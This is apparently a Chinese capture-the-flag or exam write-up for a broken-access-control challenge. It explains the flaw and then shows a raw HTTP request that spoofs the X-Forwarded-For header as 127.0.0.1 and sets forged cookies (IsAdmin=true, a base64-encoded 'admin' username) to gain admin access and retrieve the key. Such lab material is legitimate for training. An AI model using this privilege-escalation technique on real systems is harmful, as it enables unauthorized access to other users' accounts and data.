# 第一题

失效的访问控制
失效的访问控制， 指未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据（ 直接的对象引用或限制的URL ） 。例如： 访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。

请使用admin用户访问权限获取KEY

## write Up

使用x-forwarded-for 绕过本地验证,修改cookie中值,绕过权限

```http
GET http://211.103.180.146:35025/pte/start/ HTTP/1.1
Host: 211.103.180.146:35025
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://211.103.180.146:35025/pte/
Accept-Encoding: gzip, deflate, br
Cookie: IsAdmin=true; Username=YWRtaW4%3d
x-forwarded-for: 127.0.0.1
Connection: keep-alive
```
